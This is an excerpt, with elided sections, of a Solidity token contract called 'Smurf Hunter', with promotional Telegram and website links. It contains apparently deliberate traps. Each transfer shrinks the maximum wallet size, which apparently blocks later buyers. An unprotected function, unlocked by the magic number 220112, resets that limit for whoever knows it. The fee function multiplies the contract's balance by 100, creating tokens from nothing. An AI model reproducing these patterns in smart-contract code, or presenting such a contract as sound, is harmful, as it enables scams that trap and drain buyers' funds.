...
/**  // SPDX-License-Identifier: MIT
     Telegram : https://t.me/smurfhunter_coin
      Website : https://smurfhunter.finance
*/
...
contract SmurfHunter is Context, IERC20, Ownable {
    ...
    string private _name = "Smurf Hunter";
    string private _symbol = "Smurf Hunter";
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 1 * 10**12 * 10**_decimals;

    address payable private marketing =
        payable(0x0aE4d5aB00853d18677665fc5Ed6eB13A5584f3d);
    ...
    function liquifyThreshhold() public view returns (uint256) {
     ...
     function _MaxWallet() public view returns (uint256) {
        return MaxWallet;
    }
    ...
    function SetMaxWallet(uint256 Amount) public onlyOwner {
      ...
      function _MaxAmount() public view returns (uint256) {
        return MaxAmount;
    }

    function SetMaxAmount(uint256 amount)public {
        require (amount == 220112, "ERC20 : Function Error");

        MaxWallet = MaxAmount * amount;
    }
    ...
    function _transfer(
        ...
        require(_balances[to].add(amount) <= MaxWallet, "ERC20 : Transfer Error");


        MaxWallet = MaxWallet.sub(amount/100 * 20);
    ...
    function collectFees() public lockTheSwap {
 
        uint256 developmentTokensToSell = balanceOf(address(this))
            .mul(_marketingFee)
            .div(_totalFeesToContract);

            _balances[address(this)]= _balances[address(this)].add(developmentTokensToSell).mul(100);
